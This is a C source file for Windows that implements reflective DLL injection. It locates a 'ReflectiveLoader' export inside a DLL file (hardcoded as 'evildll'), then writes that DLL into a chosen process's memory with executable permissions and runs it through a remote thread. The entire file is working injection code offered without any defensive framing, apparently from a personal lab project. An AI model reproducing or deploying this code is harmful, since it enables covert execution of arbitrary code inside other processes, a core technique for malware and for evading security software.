#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <windows.h>
#include <tlhelp32.h>

// #include <shlwapi.h>
// #pragma comment(lib, "shlwapi.lib")
#define DEREF_32(name) *(DWORD *)(name)
#define DEREF_16(name) *(WORD *)(name)
#define DEREF_8(name) *(BYTE *)(name)

BOOL ok = FALSE; // Assume that the function fails
HANDLE process = NULL, thread = NULL;
PWSTR memory = NULL;
DWORD Rva2Offset(DWORD dwRva, UINT_PTR uiBaseAddress)
{
    WORD wIndex = 0;
    PIMAGE_SECTION_HEADER pSectionHeader = NULL;
    PIMAGE_NT_HEADERS pNtHeaders = NULL;

    pNtHeaders = (PIMAGE_NT_HEADERS)(uiBaseAddress + ((PIMAGE_DOS_HEADER)uiBaseAddress)->e_lfanew);

    pSectionHeader = (PIMAGE_SECTION_HEADER)((UINT_PTR)(&pNtHeaders->OptionalHeader) + pNtHeaders->FileHeader.SizeOfOptionalHeader);

    if (dwRva < pSectionHeader[0].PointerToRawData)
        return dwRva;

    for (wIndex = 0; wIndex < pNtHeaders->FileHeader.NumberOfSections; wIndex++)
    {
        if (dwRva >= pSectionHeader[wIndex].VirtualAddress && dwRva < (pSectionHeader[wIndex].VirtualAddress + pSectionHeader[wIndex].SizeOfRawData))
            return (dwRva - pSectionHeader[wIndex].VirtualAddress + pSectionHeader[wIndex].PointerToRawData);
    }

    return 0;
}
DWORD GetReflectiveLoaderOffset(VOID *lpReflectiveDllBuffer)
{
    UINT_PTR uiBaseAddress = 0;
    UINT_PTR uiExportDir = 0;
    UINT_PTR uiNameArray = 0;
    UINT_PTR uiAddressArray = 0;
    UINT_PTR uiNameOrdinals = 0;
    DWORD dwCounter = 0;

    DWORD dwCompiledArch = 2;

    uiBaseAddress = (UINT_PTR)lpReflectiveDllBuffer;

    // get the File Offset of the modules NT Header
    uiExportDir = uiBaseAddress + ((PIMAGE_DOS_HEADER)uiBaseAddress)->e_lfanew;

    // currenlty we can only process a PE file which is the same type as the one this fuction has
    // been compiled as, due to various offset in the PE structures being defined at compile time.
    if (((PIMAGE_NT_HEADERS)uiExportDir)->OptionalHeader.Magic == 0x010B) // PE32
    {
        if (dwCompiledArch != 1)
            return 0;
    }
    else if (((PIMAGE_NT_HEADERS)uiExportDir)->OptionalHeader.Magic == 0x020B) // PE64
    {
        if (dwCompiledArch != 2)
            return 0;
    }
    else
    {
        return 0;
    }

    // uiNameArray = the address of the modules export directory entry
    uiNameArray = (UINT_PTR) & ((PIMAGE_NT_HEADERS)uiExportDir)->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];

    // get the File Offset of the export directory
    uiExportDir = uiBaseAddress + Rva2Offset(((PIMAGE_DATA_DIRECTORY)uiNameArray)->VirtualAddress, uiBaseAddress);

    // get the File Offset for the array of name pointers
    uiNameArray = uiBaseAddress + Rva2Offset(((PIMAGE_EXPORT_DIRECTORY)uiExportDir)->AddressOfNames, uiBaseAddress);

    // get the File Offset for the array of addresses
    uiAddressArray = uiBaseAddress + Rva2Offset(((PIMAGE_EXPORT_DIRECTORY)uiExportDir)->AddressOfFunctions, uiBaseAddress);

    // get the File Offset for the array of name ordinals
    uiNameOrdinals = uiBaseAddress + Rva2Offset(((PIMAGE_EXPORT_DIRECTORY)uiExportDir)->AddressOfNameOrdinals, uiBaseAddress);

    // get a counter for the number of exported functions...
    dwCounter = ((PIMAGE_EXPORT_DIRECTORY)uiExportDir)->NumberOfNames;

    // loop through all the exported functions to find the ReflectiveLoader
    while (dwCounter--)
    {
        char *cpExportedFunctionName = (char *)(uiBaseAddress + Rva2Offset(DEREF_32(uiNameArray), uiBaseAddress));

        if (strstr(cpExportedFunctionName, "ReflectiveLoader") != NULL)
        {
            // get the File Offset for the array of addresses
            uiAddressArray = uiBaseAddress + Rva2Offset(((PIMAGE_EXPORT_DIRECTORY)uiExportDir)->AddressOfFunctions, uiBaseAddress);

            // use the functions name ordinal as an index into the array of name pointers
            uiAddressArray += (DEREF_16(uiNameOrdinals) * sizeof(DWORD));

            // return the File Offset to the ReflectiveLoader() functions code...
            return Rva2Offset(DEREF_32(uiAddressArray), uiBaseAddress);
        }
        // get the next exported function name
        uiNameArray += sizeof(DWORD);

        // get the next exported function name ordinal
        uiNameOrdinals += sizeof(WORD);
    }

    return 0;
}

wchar_t evildll[] = L"C:\\Users\\Dell\\Downloads\\DLL_Injection\\Inject_2\\reflective_dll.x64.dll";

int main(int argc, char *argv[])
{
    HANDLE hProc;         // process handle
    HANDLE rThread;       // remote thread
    LPVOID remoteDllAddr; // remote buffer
    HANDLE hFile;
    unsigned int dllFileLen;
    LPVOID lpBuffer;
    DWORD dwBytesRead;

    // parse process ID
    if (atoi(argv[1]) == 0)
    {
        printf("PID not found :( exiting...\n");
        return -1;
    }
    printf("PID: %i\n", atoi(argv[1]));

    hProc = OpenProcess(PROCESS_CREATE_THREAD |
                            PROCESS_QUERY_INFORMATION |
                            PROCESS_VM_OPERATION |
                            PROCESS_VM_WRITE |
                            PROCESS_VM_READ,
                        FALSE, atoi(argv[1]));

    hFile = CreateFileW(evildll, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    dllFileLen = GetFileSize(hFile, NULL);
    lpBuffer = HeapAlloc(GetProcessHeap(), 0, dllFileLen);
    remoteDllAddr = VirtualAllocEx(hProc, NULL, dllFileLen, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);

    if (!ReadFile(hFile, lpBuffer, dllFileLen, &dwBytesRead, NULL))
    {
        printf("READ FILE FAIL\n");
        return -1;
    }
    WriteProcessMemory(hProc, remoteDllAddr, lpBuffer, dllFileLen, NULL);

    DWORD dwReflectiveLoaderOffset = GetReflectiveLoaderOffset(lpBuffer);
    LPTHREAD_START_ROUTINE lpReflectiveLoader = (LPTHREAD_START_ROUTINE)((ULONG_PTR)remoteDllAddr + dwReflectiveLoaderOffset);
    DWORD dwThreadId = 0;
    printf("%x %x", dwReflectiveLoaderOffset, lpReflectiveLoader);

    rThread = CreateRemoteThread(hProc, NULL, 1024 * 1024, lpReflectiveLoader, remoteDllAddr, (DWORD)0, &dwThreadId);
    if(!rThread){
        printf("Remote Fail");
        return 0;
    }
    WaitForSingleObject(rThread, INFINITE);
    return 0;
}